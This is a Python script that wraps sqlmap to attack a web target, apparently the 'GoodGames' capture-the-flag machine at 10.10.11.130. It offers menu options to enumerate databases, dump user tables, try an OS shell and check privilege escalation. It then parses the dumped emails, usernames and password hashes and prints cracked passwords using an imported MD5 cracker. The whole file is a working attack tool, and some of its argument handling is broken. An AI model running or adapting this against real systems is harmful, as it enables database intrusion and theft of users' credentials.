import subprocess
import re
from md5PasswordCracker import crack_hash

sqlmap_params = {
    "1": "-r request.txt --batch (Attack from request file)",
    "2": "--dbs (Enumerate DB databases)",
    "3": "-D DB --tables (List tables in DB)",
    "4": "-D DB -T USERS -C name,pass --dump (Extract user table data)",
    "5": "-D DB -T POSTS --search (Search posts table for string)",
    "6": "--os-shell (Attempt OS shell if vulnerable)",
    "7": "--priv-esc (Check DB privileges for access)",
    "8": "Custom sql parameters",
    "9": "default specifically for GoodGames"
}


def run_sqlmap():
    sqlmap_path = input("Enter sqlmap.py file path (example: C:\\Users\\yourUsername\\Desktop\\sqlmap\\sqlmap.py): ")

    url = input("Please a url for sqlmap to target (i.e http://10.10.11.130): ")

    print("Select SQLMap actions (enter numbers separated by spaces): ")

    for key, desc in sqlmap_params.items():
        print(f"{key}. {desc}")

    selections = input("> ")

    selected_params = [p.split(' ', 1)[0] for p in [sqlmap_params[x] for x in selections.split()]]
    if selections == '9':
        command = ['python', sqlmap_path, '-D', 'main', '-T', 'user', '-dump', '--batch', '-u', 'http://10.10.11.130',
                   '--forms']
    elif selections == '8':
        print("You will be filling in what comes after sqlmap. For example,"
              "\nsqlmap '-D DB -T POSTS --search' you are replacing the"
              "\ntext in the single quotes")
        user_params = input("Enter custom params: ")
        command = ['python', sqlmap_path] + user_params + [f'-u {url} --forms']
    else:
        command = ['python', sqlmap_path] + selected_params + [f'-u {url} --forms']

    try:
        output = subprocess.check_output(command, universal_newlines=True)
        return output
    except subprocess.CalledProcessError as e:
        print("SQLMap error:", e)
        return None


def extract_entries(sqlmap_output):
    pattern = r'\|\s*\d\s*\|\s*([\w.@]+)\s*\|\s*([\w.@]+)\s*\|\s*([\w]+)\s*\|'
    matches = re.findall(pattern, sqlmap_output)

    entries = []
    for match in matches:
        entry = {
            'Email': match[0],
            'Name': match[1],
            'Password': match[2]
        }
        entries.append(entry)

    return entries


def print_entries(entries):
    for idx, entry in enumerate(entries, start=1):
        print(f"Entry {idx}")
        print(f"Email: {entry['Email']}")
        print(f"Username: {entry['Name']}")
        print(f"Cracked Password: {crack_hash(entry['Password'])}")
        print()


def main():
    output = run_sqlmap()
    entries = extract_entries(output)
    print_entries(entries)
    return entries
